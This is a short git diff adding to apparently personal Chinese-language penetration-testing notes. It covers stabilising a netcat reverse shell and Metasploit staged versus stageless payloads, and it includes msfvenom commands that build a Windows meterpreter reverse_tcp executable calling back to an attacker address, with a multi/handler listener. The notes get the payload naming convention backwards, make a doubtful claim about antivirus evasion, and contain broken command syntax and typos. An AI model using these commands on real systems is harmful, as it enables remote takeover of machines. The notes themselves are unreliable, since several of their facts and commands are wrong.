@@ -100,4 +100,13 @@ Http_header 包含IP的参数:X-Forwarded-For,X-Forwarded-Host,X-Client-IP,X-Rem
 
 在linux 主机上建立一个稳定的shell ,第一：nc -lnvp port;第二： python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm;第三:按下ctrl+z键;第四 ：输入  stty raw -echo;fg
 
+metasploit shell payload分为两种，一种是staged ,一种是stageless.
+staged 的shell 分为两个部分，一部分为一段小代码用与客户与服务器链接，另一部分用于从攻击机上下载一段代码到目标机，并执行。
+stageless 的shell只有一部分，直接完成staged shell的所有功能
 
+staged 的shell命名规则为 os /arch /shellname  例如  windows/x64/shell_reverse_tcp 而stageless的命名规则为windows/x64/shell/reverse_tcp,区别是一个用/,一个用_
+staged的shell更稳定，不容易被杀毒软件发现，stageless更容易被发现。
+
+msfvenom -p payload -f (.exe,.elf,.python,.asp,.php) -o filename lhost=127.0.0.1 lport=4444
+msfvenom -p windows/x86/meterprete/reverse_tcp -f .exe -o shell.exe lhost=192.168.0.2 lport=4444
+在metasplot中要选择 multi/handler 来发射 windows/x86/meterpreter/reverse_tcp 与上面的shell paylaod相对应
